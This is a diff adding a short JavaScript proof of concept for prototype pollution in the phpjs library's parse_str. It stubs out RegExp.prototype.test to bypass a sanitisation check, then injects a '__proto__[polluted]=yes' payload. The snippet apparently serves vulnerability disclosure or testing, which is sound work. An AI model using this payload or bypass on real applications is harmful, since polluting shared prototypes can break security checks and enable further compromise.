@@ -1,0 +1,5 @@
+RegExp.prototype.test = () => false;
+console.log({}.polluted);
+const p = require('phpjs');
+p.parse_str('__proto__[polluted]=yes', {});
+console.log({}.polluted);
